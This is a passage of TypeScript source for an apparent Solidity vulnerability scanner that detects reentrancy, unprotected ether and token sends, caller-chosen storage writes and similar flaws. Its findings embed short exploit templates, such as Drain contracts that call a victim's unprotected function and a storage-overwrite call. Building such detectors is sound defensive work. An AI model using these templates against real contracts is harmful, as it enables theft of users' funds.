      // that gate (no callee.base), so the internal branch inside it
      // never runs for them. Without this synthetic ExtCall, the
      // inherited _safeMint hook would never produce a window, and
      // the MettiApe mint reentrancy mediums would die with the view
      // call they currently (wrongly) rest on. kind "member" keeps
      // the severity at medium; sendsValue false (no ether moves).
      // Member calls (token.safeTransferFrom(...)) already produce an
      // ExtCall via noteCall below, so only bare calls need this.
      if (!callee.base && member && HOOK_CARRIERS.has(member)) {
        noteCall({
          kind: "member",
          line: lineOf(node, delta, fn.line),
          checked: true,
          sendsValue: false,
          target: member,
          targetIsParam: false,
          targetIsConst: false,
          argCount: args.length,
          raw: sliceOf(parsed, node),
          synthetic: true,
        });
      }
      if (member && (LOW_LEVEL.has(member) || member === "selfdestruct" || member === "suicide" || (!BUILTIN.has(member) && callee.base))) {
        const baseName = rootIdent(callee.base ?? undefined);
        const target = sliceOf(parsed, callee.base ?? undefined);
        const sendsValue = namedValue(callee.named, "value") || member === "transfer" || member === "send";
        let kind: ExtKind = "member";
        if (member === "call") kind = "call";
        else if (member === "delegatecall") kind = "delegatecall";
        else if (member === "staticcall") kind = "staticcall";
        else if (member === "callcode") kind = "callcode";
        else if (member === "send") kind = "send";
        else if (member === "transfer" && args.length <= 1) kind = "transfer";
        else if (member === "transfer" || member === "transferFrom") kind = "erc20";
        else if (member === "selfdestruct" || member === "suicide") kind = "selfdestruct";
        else if (rootIdent(callee.base ?? undefined) === "this" || (baseName && !stateNames.has(baseName) && baseName !== "abi" && baseName !== "msg" && baseName !== "block")) {
          kind = "member";
        } else if (baseName && stateNames.has(baseName)) kind = "member";
        else kind = "member";

        const isLow = kind === "call" || kind === "delegatecall" || kind === "staticcall" || kind === "callcode" || kind === "send" || kind === "transfer" || kind === "selfdestruct" || kind === "erc20";
        const internal = !callee.base && member && byName.has(member);
        // Fix 15: super.* calls are NOT external calls. A super call
        // is an internal JUMP to the base implementation — no CALL
        // opcode, no control transfer to another contract. TRYfinance
        // read-only ×2 + the _transfer reentrancy medium (whose
        // "external call" was super._transfer) and AsyncArtwork's
        // expectedTokenSupply read-only (super._safeMint) all die
        // here. Documented limitation: a super call to a hook-carrying
        // function (standard OZ ERC721 _transferFrom with its receiver
        // hook) + a demonstrated consumer is missed — exotic, accepted
        // for this batch; no transitive callee-body analysis.
        const isSuperCall = callee.base?.type === "Identifier" && (callee.base as AstNode).name === "super";
        // Library calls are compile-time inlined — no CALL opcode, no
        // control transfer — but ONLY when the library fn itself cannot
        // call out. A pure/view library fn (MerkleProof.verify) can only
        // compute, so it is not an external call. A non-view library fn
        // (SafeERC20.safeTransfer) may contain a real .call, so it stays
        // an external call. An imported library is invisible here, so
        // this covers in-file / flattened libraries.
        const libraryFn =
          baseName && member
            ? model.contracts
                .find((c) => c.kind === "library" && c.name === baseName)
                ?.functions.find((f) => f.name === member)
            : undefined;
        const isPureLibraryCall =
          libraryFn !== undefined &&
          (libraryFn.mutability === "pure" || libraryFn.mutability === "view");
        // Fix 29: self/base-qualified calls are internal JUMPs. A
        // member call whose base is a BARE identifier naming a contract
        // type in the inheritance hierarchy (this contract or one of
        // its bases — ERC721.ownerOf(...) in a contract inheriting
        // ERC721) is a qualified internal call, not an external CALL.
        // The base must NOT be a state variable or parameter: a call
        // on a contract-typed variable (token.transfer(...)) is a
        // call on another instance, so it stays external.
        const isSelfQualifiedCall =
          callee.base?.type === "Identifier" &&
          baseName !== null &&
          !contract.stateVars.some((v) => v.name === baseName) &&
          !fn.params.some((p) => p.name === baseName) &&
          (baseName === contract.name || contract.bases.includes(baseName)) &&
          model.contracts
            .find((c) => c.name === baseName)
            ?.functions.some((f) => f.name === member) === true;
        // Fix 27: the window-opening call must be capable of reaching
        // attacker code. A view/pure call to a NON-attacker-controlled
        // callee has no hook path: the callee cannot execute attacker
        // code, so it opens no window. The callee is resolved via the
        // base's declared type (state var or parameter) or the type
        // name itself; unresolvable callees fail closed (still count).
        const resolved = member && baseName ? resolveCalleeFn(member, baseName, fn, contract, model) : undefined;
        const isNonWindowViewCall =
          resolved !== undefined &&
          (resolved.fn.mutability === "view" || resolved.fn.mutability === "pure") &&
          !isCallerControlled(baseName ?? "", fn, contract);
        if (!internal && !isSuperCall && !isPureLibraryCall && !isSelfQualifiedCall && !isNonWindowViewCall && (isLow || kind === "member") && member && !BUILTIN.has(member) && !SAFE_MATH.has(member)) {
          // Skip obvious value-type methods and type conversions.
          // A call that CONSTRUCTS a value is not an external call and
          // transfers no control: a struct constructor
          // (F3Ddatasets.TeamFee(32, 0) — base is a BARE identifier
          // naming a known contract or library, member is a Capitalized
          // struct name, and the member is not a real function of that
          // type). The bare-identifier base is what separates it from a
          // real call on a converted type: IRouter(router).WETH() has
          // member WETH and rootIdent IRouter, but its base is a
          // FunctionCall, not a bare identifier, so it still counts.
          // FomoXP's constructor only assigns
          // fees_[i] = F3Ddatasets.TeamFee(...) — no CALL opcode — but
          // was flagged for read-only reentrancy because the struct
          // constructor counted as a call before the writes. Imported
          // types are invisible to the model, so they still count as
          // calls: fail closed.
          const typeNames = new Set(model.contracts.map((c) => c.name));
          const isConstruction =
            callee.base?.type === "Identifier" &&
            /^[A-Z]/.test(member) &&
            baseName !== null &&
            typeNames.has(baseName) &&
            libraryFn === undefined;
          // Fix 16: own/inherited token transfer — a bare
          // transfer/transferFrom resolving to this contract's own
          // or an inherited function, or this.transfer(...). The
          // token being transferred is THIS contract's token, not
          // an external token's. The whole block (noteCall +
          // token-drain) is skipped: an own transfer is an internal
          // call, not an external one — it must not set flow.seen
          // (a write after the own transfer is not reentrancy) and
          // it is not a drain of an external token.
          const isThisTokenCall = callee.base?.type === "Identifier" && (callee.base as AstNode).name === "this" && (member === "transfer" || member === "transferFrom");
          const ownToken = (member === "transfer" || member === "transferFrom") && (((!callee.base && (byName.has(member) || inherited.has(member))) || isThisTokenCall));
          if (member !== "push" && member !== "pop" && !isConstruction && !ownToken) {
            const checked = kind === "transfer" || kind === "selfdestruct" ? true : !asStatement;
            // Fix 25: the ERC-20 recipient for the downgrade check
            // (transfer/safeTransfer arg 0, transferFrom arg 1).
            const recipient = kind === "erc20"
              ? sliceOf(parsed, args[member === "transferFrom" ? 1 : 0] as AstNode)
              : "";
            // Fix 17: the ether-send amount for the ledger-bound
            // check (transfer/send arg 0, call{value:} arg).
            let amount = "";
            if (member === "transfer" || member === "send") amount = sliceOf(parsed, args[0] as AstNode);
            else if (member === "call" && callee.named) {
              const named = callee.named as AstNode;
              const names = (named.names as string[] | undefined) ?? [];
              const namedArgs = (named.arguments as AstNode[] | undefined) ?? [];
              const vi = names.indexOf("value");
              if (vi >= 0) amount = sliceOf(parsed, namedArgs[vi]);
            }
            // Fix 38: the literal gas cap, when the source states one
            // as a number literal (gas: 3000). A computed or named cap
            // earns no credit — its value is unknown at analysis time.
            let gasCap: number | null = null;
            if (callee.named) {
              const named = callee.named as AstNode;
              const names = (named.names as string[] | undefined) ?? [];
              const namedArgs = (named.arguments as AstNode[] | undefined) ?? [];
              const gi = names.indexOf("gas");
              const argNode = gi >= 0 ? namedArgs[gi] : undefined;
              if (argNode && argNode.type === "NumberLiteral") {
                const v = Number(String((argNode as AstNode).number ?? ""));
                if (Number.isFinite(v)) gasCap = v;
              }
            }
            // Fix 38: a call on a stored contract this function never
            // assigns reaches a FIXED callee (a router, a token), not
            // a caller-chosen one.
            const targetIsFixedContract = Boolean(
              baseName &&
              (stateNames.has(baseName) || consts.has(baseName)) &&
              !new RegExp(`\\b${baseName}\\s*[-+*/%]?=[^=]`).test(fn.source),
            );
            noteCall({
              kind,
              line: lineOf(node, delta, fn.line),
              checked,
              sendsValue: sendsValue && kind !== "erc20",
              target,
              targetIsParam: Boolean(baseName && (params.has(baseName) || baseName === "msg")),
              targetIsConst: Boolean(baseName && consts.has(baseName)),
              argCount: args.length,
              raw: sliceOf(parsed, node),
              recipient,
              ownToken,
              amount,
              gasCap,
              targetIsFixedContract,
            });
            // Token drain: an unauthenticated function moves an
            // arbitrary amount of the contract's tokens to a FIXED
            // address (FUUUU's rescueERC20: anyone calls
            // token.transfer(devWallet, amount)). Scoped to the
            // fixed-recipient shape on purpose: a param recipient
            // (token.transfer(to, amt)) is also the DEX-pair / claim
            // shape, where the payout is bounded by an invariant the
            // detector cannot see — flagging it would FP every pair
            // swap. transferFrom is excluded (it pulls the caller's
            // own allowance-gated tokens), the token's own
            // transfer/transferFrom is excluded, a recipient of
            // msg.sender is a withdrawal, and a per-user debit is a
            // withdrawal too. A literal amount (transfer(devWallet,
            // 100)) is a bounded payout, not a drain; an amount
            // derived from the caller's own balance
            // (balances[msg.sender]) is the caller's own funds.
            if (
              (member === "transfer" || member === "safeTransfer") &&
              args.length >= 2 &&
              !authed &&
              !fn.isConstructor &&
              fn.visibility !== "internal" &&
              fn.visibility !== "private" &&
              fn.name !== "transfer" &&
              fn.name !== "transferFrom" &&
              fn.name !== "safeTransfer" &&
              !debitsOwnCredit(fn)
            ) {
              const rawCall = sliceOf(parsed, node);
              const drainMatch = rawCall.match(/\.\s*(transfer|safeTransfer)\s*\(\s*([^,]+?)\s*,\s*([^)]+?)\s*\)/);
              const recipient = (drainMatch?.[2] ?? "").trim();
              const amount = (drainMatch?.[3] ?? "").trim();
              const recipientFixed = recipient !== "" && !isCallerControlled(recipient, fn, contract);
              const amountControlled =
                amount !== "" &&
                !/^\d+(\.\d+)?\s*(ether|gwei|wei)?$/.test(amount) &&
                !/msg\.sender/.test(amount) &&
                isCallerControlled(amount, fn, contract);
              if (recipientFixed && amountControlled) {
                push(make({
                  severity: "high",
                  swc: "SWC-105",
                  title: `${fn.name} sends tokens with no access check`,
                  confidence: "medium",
                  detector: "token-drain",
                  summary: `${fn.name} calls ${member} on an external token, moving a caller-controlled amount to a fixed address, with no access check and no per-user debit. Anyone can drain whatever of that token the contract holds to the fixed recipient.`,
                  walkthrough: `1. ${fn.name} is externally callable with no modifier or msg.sender check.\n2. It moves ${amount || "a caller-chosen amount"} of an external token to ${recipient || "a fixed address"}.\n3. There is no per-user credit debit, so this is not a withdrawal of the caller's own funds.\n4. Call it with any amount up to the contract's token balance.`,
                  exploitSolidity: `interface IDrain { function ${fn.name}(address token, uint256 amount) external; }\ncontract Drain { function go(address victim, address token, uint256 amt) external { IDrain(victim).${fn.name}(token, amt); } }`,
                  remediationSolidity: `function ${fn.name}(address token, uint256 amount) external onlyOwner {\n    IERC20(token).transfer(${recipient || "to"}, amount);\n}`,
                  locationFn: fn.name,
                  locationLine: lineOf(node, delta, fn.line),
                  snippet: snippet(parsed, lineOf(node, delta, fn.line) + delta, delta),
                }));
              }
            }
          }
        }
        if ((member === "push" || member === "pop") && baseName && stateNames.has(baseName)) noteWrite(callee.base ?? undefined);
        if (internal && member) {
          const info = direct.get(member);
          // The callee's writes happen INSIDE the callee, around its own
          // external call — not after a call in THIS function. Record
          // them against the caller's own seen call (pre-call if none
          // yet), THEN note the callee's external effects. The old
          // order (synthetic call first) misattributed the callee's
          // internal ordering to the caller: DailyDivs transferAndCall
          // was flagged for transfer()'s writes, though transferAndCall
          // writes nothing after its own external call. The callee
          // itself is scanned separately and flagged on its own
          // ordering, so nothing is lost.
          if (info && info.writes.size > 0) {
            flow.sawWrite = true;
            if (flow.seen) flow.callThenWrite = true;
            for (const w of info.writes) (flow.seen ? flow.postCallWrites : flow.preCallWrites).add(w);
          }
          if (info?.external) {
            // A callee whose only external effects are 2300-gas
            // transfer/send has no reentrancy window: report the
            // synthetic call as a stipend call so the reentrancy
            // detector downgrades it to info instead of critical.
            const kinds = info.externalKinds ?? new Set<string>();
            const fullCall = [...kinds].some((k) => k === "call" || k === "delegatecall" || k === "staticcall" || k === "callcode");
            noteCall({
              kind: fullCall || kinds.size === 0 ? "call" : "transfer",
              line: lineOf(node, delta, fn.line),
              checked: true,
              sendsValue: true,
              target: member,
              targetIsParam: false,
              targetIsConst: false,
              argCount: args.length,
              raw: member + "()",
              synthetic: true,
            });
          }
        }
      }
      if (namedValue(callee.named, "gas")) {
        push(make({
          severity: "low",
          swc: "SWC-134",
          title: `${fn.name} sets a fixed gas stipend`,
          confidence: "medium",
          detector: "hardcoded-gas",
          summary: "A named `gas:` argument caps the callee. If the cap is too low the call fails; if the failure is ignored, state still updates.",
          walkthrough: "1. The `gas` option replaces the 63/64 rule with a hard cap.\n2. Opcode repricing (EIP-2929 and later) makes old constants wrong.",
          exploitSolidity: "",
          remediationSolidity: `// Omit gas: unless you have a measured, documented reason.\n(bool ok, ) = target.call{value: amount}(data);\nrequire(ok);`,
          locationFn: fn.name,
          locationLine: lineOf(node, delta, fn.line),
          snippet: snippet(parsed, (node.loc?.start.line ?? fn.line + delta), delta),
        }));
      }
      // Fix 30: the encodePacked check moved to scanSimple (text
      // based): the packed bytes must flow into a hash. See there.
      const amountOut = namedAmountZero(callee.named);
      if (amountOut) {
        push(make({
          severity: "high",
          swc: null,
          title: `${fn.name} sets a zero slippage bound`,
          confidence: "medium",
          detector: "slippage",
          summary: "A named amountOutMin (or amount0Min/amount1Min) argument is zero. The swap can be sandwiched to any price.",
          walkthrough: "1. The router will accept any output, including one wei.\n2. An attacker sandwiches the transaction: front-run to move the pool, let this call through, back-run to restore the price.\n3. Pass a caller-supplied minimum and deadline.",
          exploitSolidity: "",
          remediationSolidity: `router.swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline);`,
          locationFn: fn.name,
          locationLine: lineOf(node, delta, fn.line),
          snippet: snippet(parsed, (node.loc?.start.line ?? fn.line + delta), delta),
        }));
      }
      return;
    }
    if (node.type === "AssemblyCall" && node.functionName === "sstore") {
      const args = (node.arguments as AstNode[] | undefined) ?? [];
      const slot = rootIdent(args[0]);
      if (slot && params.has(slot)) {
        push(withAccessControlCap(make({
          severity: "critical",
          swc: "SWC-124",
          title: `${fn.name} SSTOREs to a caller-chosen slot`,
          confidence: "high",
          detector: "assembly-param-sstore",
          summary: "The first argument of sstore is a function parameter. The caller picks the storage slot and can overwrite owner or balances.",
          walkthrough: "1. sstore(slot, value) writes `value` to absolute slot `slot`.\n2. Slot 0 is often the owner. Slot 1 is often the first mapping's length or a packed address.\n3. There is no bounds check an ordinary assignment would have given you.",
          exploitSolidity: `// If the function is public: victim.write(0, uint256(uint160(attacker)));`,
          remediationSolidity: `// Do not take a raw slot from the caller.\nbalances[msg.sender] = amount;`,
          locationFn: fn.name,
          locationLine: lineOf(node, delta, fn.line),
          snippet: snippet(parsed, (node.loc?.start.line ?? fn.line + delta), delta),
        }), authed));
      } else {
        noteWrite(node);
        push(make({
          severity: "medium",
          swc: "SWC-124",
          title: `${fn.name} writes storage from assembly`,
          confidence: "medium",
          detector: "assembly-sstore",
          summary: "An inline sstore bypasses the type checker. Confirm the slot is a constant the layout actually owns.",
          walkthrough: "1. Assembly storage writes do not follow struct or mapping packing unless you replicate it.\n2. A wrong slot corrupts an adjacent variable with no revert.",
          exploitSolidity: "",
          remediationSolidity: "// Prefer a normal assignment unless this is a measured, reviewed hot path.",
          locationFn: fn.name,
          locationLine: lineOf(node, delta, fn.line),
          snippet: snippet(parsed, (node.loc?.start.line ?? fn.line + delta), delta),
        }));
      }
      return;
    }
    for (const [k, v] of Object.entries(node)) {
      if (k === "loc" || k === "range" || k === "type") continue;
      if (v && typeof v === "object") noteExpr(v, false);
    }
  };

  const scanStmts = (stmts: AstNode[], local: Flow) => {
    for (const stmt of stmts) scanStmt(stmt, local);
  };

  const scanStmt = (stmt: AstNode, local: Flow) => {
    // Run expression analysis against `local` by temporarily swapping — we use the outer `flow`
    // object the closures close over. Callers pass `flow` or we mutate a provided flow by
    // assigning into the closed-over one. To support branches we rebind via copy-back below.
    if (stmt.type === "Block" || stmt.type === "UncheckedStatement") {
      const block = (stmt.type === "UncheckedStatement" ? stmt.block : stmt) as AstNode;
      const inner = (block.statements as AstNode[] | undefined) ?? [];
      if (stmt.type === "UncheckedStatement") flagUnchecked(fn, stmt, model, parsed, delta, push);
      scanStmts(inner, local);
      return;
    }
    if (stmt.type === "IfStatement") {
      noteExpr(stmt.condition, false);
      const before = snapshot(flow);
      scanStmtOrBlock(stmt.trueBody as AstNode | undefined);
      const left = snapshot(flow);
      restore(flow, before);
      scanStmtOrBlock(stmt.falseBody as AstNode | undefined);
      const right = snapshot(flow);
      flow.seen = left.seen ?? right.seen ?? before.seen;
      flow.sawWrite = left.sawWrite || right.sawWrite || before.sawWrite;
      flow.sawCall = left.sawCall || right.sawCall || before.sawCall;
      flow.callThenWrite = left.callThenWrite || right.callThenWrite || before.callThenWrite;
      flow.writeThenCall = left.writeThenCall || right.writeThenCall || before.writeThenCall;
      flow.preCallWrites = new Set([...before.preCallWrites, ...left.preCallWrites, ...right.preCallWrites]);
      flow.postCallWrites = new Set([...before.postCallWrites, ...left.postCallWrites, ...right.postCallWrites]);
      flow.sawEtherSend = left.sawEtherSend || right.sawEtherSend || before.sawEtherSend;
      flow.sendTargets = [...before.sendTargets, ...left.sendTargets, ...right.sendTargets];
      flow.allSendsAreRefunds = left.allSendsAreRefunds && right.allSendsAreRefunds && before.allSendsAreRefunds;
      // Fix 12: merge the window bookkeeping across branches — first
      // write line per var is the minimum across branches, reads and
      // callee calls union.
      flow.writeLines = new Map([...before.writeLines, ...left.writeLines, ...right.writeLines].map(([k]) => {
        const vals = [before.writeLines.get(k), left.writeLines.get(k), right.writeLines.get(k)].filter((v): v is number => v !== undefined);
        return [k, Math.min(...vals)] as [string, number];
      }));
      flow.readLines = new Map([...before.readLines, ...left.readLines, ...right.readLines].map(([k]) => {
        const vals = [...(before.readLines.get(k) ?? []), ...(left.readLines.get(k) ?? []), ...(right.readLines.get(k) ?? [])];
        return [k, vals] as [string, number[]];
      }));
      flow.calleeCalls = [...before.calleeCalls, ...left.calleeCalls, ...right.calleeCalls];
      flow.sendDetails = [...before.sendDetails, ...left.sendDetails, ...right.sendDetails];
      return;
    }
    if (stmt.type === "ForStatement" || stmt.type === "WhileStatement" || stmt.type === "DoWhileStatement") {
      noteExpr(stmt.conditionExpression ?? stmt.condition, false);
      noteExpr(stmt.initExpression, false);
      noteExpr(stmt.loopExpression, false);
      if (/msg\.value/.test(sliceOf(parsed, stmt))) {
        push(make({
          severity: "high",
          swc: "SWC-132",
          title: `${fn.name} uses msg.value inside a loop`,
          confidence: "high",
          detector: "msg-value-loop",
          summary: "msg.value does not decrease per iteration. Each pass can credit the same ether again.",
          walkthrough: "1. The caller attaches ETH once.\n2. Every loop iteration reads the same msg.value and adds it to a balance or uses it as a payment.\n3. N iterations mint N times the deposit.",
          exploitSolidity: `// deposit(address[] users) payable { for (...) balances[users[i]] += msg.value; }`,
          remediationSolidity: `uint256 remaining = msg.value;\nfor (uint256 i; i < users.length; ++i) {\n    balances[users[i]] += share;\n    remaining -= share;\n}`,
          locationFn: fn.name,
          locationLine: lineOf(stmt, delta, fn.line),
          snippet: snippet(parsed, (stmt.loc?.start.line ?? fn.line + delta), delta),
        }));
      }
      scanStmtOrBlock(stmt.body as AstNode | undefined);
      return;
    }
    if (stmt.type === "ExpressionStatement") {
      const expr = stmt.expression as AstNode;
      if (expr?.type === "FunctionCall") noteExpr(expr, true);
      else noteExpr(expr, false);
      return;
    }
    if (stmt.type === "VariableDeclarationStatement") {
      noteExpr(stmt.initialValue, false);
      return;
    }
    if (stmt.type === "ReturnStatement") {
      noteExpr(stmt.expression, false);
      return;
    }
    if (stmt.type === "InlineAssemblyStatement") {
      noteExpr(stmt.body, false);
      return;
    }
    noteExpr(stmt, false);
  };

  const scanStmtOrBlock = (node: AstNode | undefined) => {
    if (!node) return;
    if (node.type === "Block") scanStmts((node.statements as AstNode[]) ?? [], flow);
    else scanStmt(node, flow);
  };

  // The `local` parameter is unused by design: branches restore `flow` explicitly.
  void scanStmts;
  if (fn.body?.type === "Block") scanStmts((fn.body.statements as AstNode[]) ?? [], flow);
  else if (fn.body) scanStmt(fn.body, flow);

  // Admin / ether paths that the walker doesn't phrase as a single finding.
  // Genuine ether sends come from the walker (transfer/send/call{value}),
  // not a source regex: the regex matched token transfer(to, x) and
  // super.transfer, neither of which moves ether.
  const sends = flow.sawEtherSend;
  // An ether send is only an open drain if the caller controls a
  // recipient: a param, msg.sender, or storage this function writes.
  // A send to a fixed recipient (owner, burn, a constant) cannot be
  // redirected to the attacker, so it is not a drain.
  const drainable = flow.sendTargets.some((t) => isCallerControlled(t, fn, contract));
  // Bounds and debits may live in an internal helper (processClaim),
  // not the entry function — check the transitive call path.
  // A pure refund (every send is to msg.sender of this call's own
  // msg.value) is not a drain: the caller only ever gets their own
  // deposit back. MyobuChef's addLiquidityNoFeeAndStake refunds
  // msg.value - ETHUsed to msg.sender and was flagged CRITICAL.
  const allSources = transitiveSources(fn, byName, direct);
  // Per-item auth suppresses the ether finding for formula-priced
  // payouts (ItemSelling buyback pays buybackPriceOf to the item
  // owner) but NOT for a full-balance send: an item owner draining
  // address(this).balance is still a drain. A require(balance >=
  // price) does not count — only a send whose VALUE is the balance.
  const perItemOnly = !fn.isConstructor && authed && !isAuthed(fn, contract, model, true);
  const sendsFullBalance = /\.(transfer|send)\s*\(\s*address\s*\(\s*this\s*\)\.balance\s*\)|call\s*\{\s*value\s*:\s*address\s*\(\s*this\s*\)\.balance/.test(fn.source);
  // Fix 17: a ledger-bound refund/payout (recipient AND amount from
  // the SAME stored mapping/struct entry) is not a drain.
  // Fix 18: a send to an address a require proves == msg.sender in
  // stored-field form is a self-refund, not a drain.
  // Fix 23: a same-mapping clearing self-payout (M[msg.sender] = 0
  // + send to msg.sender) is a debit, whatever M is named.
  if (sends && drainable && (!authed || (perItemOnly && sendsFullBalance)) && !flow.allSendsAreRefunds && !allSendsLedgerBound(flow.sendDetails) && !allSendsRequireProvenSelf(fn, flow.sendTargets) && !isSameMappingClearingSelfPayout(fn, flow.sendTargets) && !/ecrecover\s*\(/.test(fn.source) && !fn.isConstructor && fn.visibility !== "internal" && fn.visibility !== "private" && !debitsOwnCredit(fn, allSources) && !isMerkleBoundedPayout(fn, flow.sendTargets, allSources) && fn.mutability !== "view" && fn.mutability !== "pure") {
    push(make({
      severity: "critical",
      swc: "SWC-105",
      title: `${fn.name} sends ether with no access check`,
      confidence: "medium",
      detector: "unprotected-ether",
      summary: `${fn.name} moves ETH and neither authenticates msg.sender nor debits a per-user balance. If the recipient or the amount is not strictly the caller's own credit, this is an open drain.`,
      walkthrough: [
        `1. ${fn.name} is ${fn.visibility || "public"} and has no onlyOwner-style modifier and no msg.sender == owner check.`,
        "2. The body contains a value-bearing call, transfer, or send.",
        "3. There is no per-user credit debit (balances/balanceOf[msg.sender]), so this is not a normal withdrawal of the caller's own credit.",
        "4. Call it directly. If it transfers address(this).balance or pays an address argument, the contract is drainable.",
      ].join("\n"),
      exploitSolidity: `interface IVictim { function ${fn.name}(address payable to) external; }\ncontract Drain {\n    function go(address victim, address payable me) external {\n        IVictim(victim).${fn.name}(me);\n    }\n}`,
      remediationSolidity: `function ${fn.name}(address payable to) external onlyOwner {\n    (bool ok, ) = to.call{value: address(this).balance}("");\n    require(ok);\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  return flow;
}

function snapshot(flow: Flow): Flow {
  return {
    ...flow,
    seen: flow.seen,
    preCallWrites: new Set(flow.preCallWrites),
    postCallWrites: new Set(flow.postCallWrites),
    sendTargets: [...flow.sendTargets],
    allSendsAreRefunds: flow.allSendsAreRefunds,
    writeLines: new Map(flow.writeLines),
    readLines: new Map([...flow.readLines].map(([k, v]) => [k, [...v]] as [string, number[]])),
    calleeCalls: [...flow.calleeCalls],
    sendDetails: [...flow.sendDetails],
  };
}

function restore(flow: Flow, snap: Flow) {
  flow.seen = snap.seen;
  flow.sawWrite = snap.sawWrite;
  flow.sawCall = snap.sawCall;
  flow.callThenWrite = snap.callThenWrite;
  flow.writeThenCall = snap.writeThenCall;
  flow.preCallWrites = new Set(snap.preCallWrites);
  flow.postCallWrites = new Set(snap.postCallWrites);
  flow.sawEtherSend = snap.sawEtherSend;
  flow.sendTargets = [...snap.sendTargets];
  flow.allSendsAreRefunds = snap.allSendsAreRefunds;
  flow.writeLines = new Map(snap.writeLines);
  flow.readLines = new Map([...snap.readLines].map(([k, v]) => [k, [...v]] as [string, number[]]));
  flow.calleeCalls = [...snap.calleeCalls];
  flow.sendDetails = [...snap.sendDetails];
}

function namedAmountZero(named: AstNode | undefined): boolean {
  if (!named || !Array.isArray(named.names) || !Array.isArray(named.arguments)) return false;
  const names = named.names as string[];
  const args = named.arguments as AstNode[];
  for (let i = 0; i < names.length; i += 1) {
    if (!/amountOutMin|amount0Min|amount1Min|minOut/i.test(names[i] ?? "")) continue;
    const arg = args[i];
    if (arg?.type === "NumberLiteral" && (arg.number === "0" || arg.number === "0x0")) return true;
  }
  return false;
}

function flagUnchecked(
  fn: FnModel,
  stmt: AstNode,
  model: SourceModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  if (model.versionFloor !== null && model.versionFloor < 8_000) return;
  const text = sliceOf(parsed, stmt);
  // No write, no overflow: an unchecked block that only reads / indexes
  // (e.g. OZ MerkleProof's `return hashes[totalHashes - 1]`) cannot wrap
  // a stored balance. Only flag blocks that actually assign, accumulate,
  // or inc/dec. Comparisons (==, !=, >=, <=) are not writes.
  const noComparisons = text.replace(/==|!=|>=|<=/g, "");
  if (!/[+\-*/%]?=|\+\+|--/.test(noComparisons)) return;
  const onlyInc = !/[^+]\+[^+]/.test(text) && !text.includes("-") && !text.includes("*") && !text.includes("/");
  push(make({
    severity: onlyInc ? "info" : "medium",
    swc: "SWC-101",
    title: onlyInc ? `${fn.name} has an unchecked increment` : `${fn.name} disables overflow checks`,
    confidence: "high",
    detector: "unchecked-block",
    summary: onlyInc
      ? "An unchecked block only bumps a counter. That is a common loop pattern and is safe if the bound cannot approach 2^256."
      : "An unchecked block wraps instead of reverting. Balances and amounts inside it can overflow.",
    walkthrough: "1. `unchecked { ... }` restores pre-0.8 wrapping for every + - * inside it.\n2. A balance written there can skip from max to zero.\n3. Keep unchecked for measured loop indexes only.",
    exploitSolidity: onlyInc ? "" : "unchecked { credit += deposit; } // wraps",
    remediationSolidity: onlyInc ? "" : "credit += deposit; // checked on 0.8+",
    locationFn: fn.name,
    locationLine: lineOf(stmt, delta, fn.line),
    snippet: snippet(parsed, (stmt.loc?.start.line ?? fn.line + delta), delta),
  }));
}

/**
 * Strip comments and string literals from Solidity source (Fix 1c).
 * Single-pass scanner: a `//` inside a string is not a comment, and a
 * quote inside a comment is not a string. Comments become spaces and
 * strings become `""`, so positions shift — use the result for boolean
 * tests and span scans only, never for line numbers.
 */
function stripCommentsAndStrings(src: string): string {
  let out = "";
  let i = 0;
  while (i < src.length) {
    const c = src[i];
    const n = src[i + 1];
    if (c === "/" && n === "/") {
      while (i < src.length && src[i] !== "\n") i += 1;
    } else if (c === "/" && n === "*") {
      i += 2;
      while (i < src.length && !(src[i] === "*" && src[i + 1] === "/")) i += 1;
      i += 2;
    } else if (c === '"' || c === "'") {
      const q = c;
      i += 1;
      while (i < src.length && src[i] !== q) {
        if (src[i] === "\\") i += 1;
        i += 1;
      }
      i += 1;
      out += '""';
    } else {
      out += c;
      i += 1;
    }
  }
  return out;
}

// Length-preserving variant of stripCommentsAndStrings: comment and
// string contents become spaces, newlines are kept, so line numbers
// computed from the result match the original source. Used by Fix 30
// so a commented-out or string-literal encodePacked/hash cannot flag
// (the F3Dx Fix 1c class: a comment containing the pattern).
function stripCommentsAndStringsKeepLines(src: string): string {
  let out = "";
  let i = 0;
  while (i < src.length) {
    const c = src[i];
    const n = src[i + 1];
    if (c === "/" && n === "/") {
      while (i < src.length && src[i] !== "\n") { out += " "; i += 1; }
    } else if (c === "/" && n === "*") {
      out += "  "; i += 2;
      while (i < src.length && !(src[i] === "*" && src[i + 1] === "/")) {
        out += src[i] === "\n" ? "\n" : " "; i += 1;
      }
      out += "  "; i += 2;
    } else if (c === '"' || c === "'") {
      const q = c;
      out += " "; i += 1;
      while (i < src.length && src[i] !== q) {
        if (src[i] === "\\") { out += "  "; i += 2; continue; }
        out += src[i] === "\n" ? "\n" : " "; i += 1;
      }
      out += " "; i += 1;
    } else {
      out += c; i += 1;
    }
  }
  return out;
}

/** Block data that can act as entropy: clock fields plus beacon/hash sources. */
const BLOCK_DATA = /block\.timestamp|\bnow\b|block\.number|block\.coinbase|blockhash\s*\(|block\.prevrandao|block\.difficulty/;

/**
 * True when a keccak256(/sha3( call has block data INSIDE its hash
 * input (Fix 1b). Paren-depth scan from the call to its matching
 * close paren, then test the span. keccak of non-block-data (EIP-712
 * typed data — TRYfinance delegateBySig) is not entropy mixing.
 */
function hashInputHasBlockData(src: string): boolean {
  for (const m of src.matchAll(/\b(?:keccak256|sha3)\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    if (BLOCK_DATA.test(src.slice(m.index! + m[0].length, i - 1))) return true;
  }
  return false;
}

/**
 * True when block data is the left operand of a % selection (Fix 1b):
 * a block-data expression followed by % in the same statement
 * (block.timestamp % n, (block.timestamp + x) % n). The [^;{}]*
 * bound keeps the match inside one statement, so a % in a later
 * statement does not count.
 */
function moduloOfBlockData(src: string): boolean {
  return /(?:block\.timestamp|\bnow\b|block\.number|block\.coinbase|blockhash\s*\([^)]*\)|block\.prevrandao|block\.difficulty)[^;{}]*%/.test(src);
}

/**
 * True when the block data in src flows ONLY into an oracle-query
 * nonce/commitment (Fix 19): the function calls
 * oraclize_query/provable_query, and every block-data occurrence is
 * inside a query/commitment call's argument span or an `unonce`
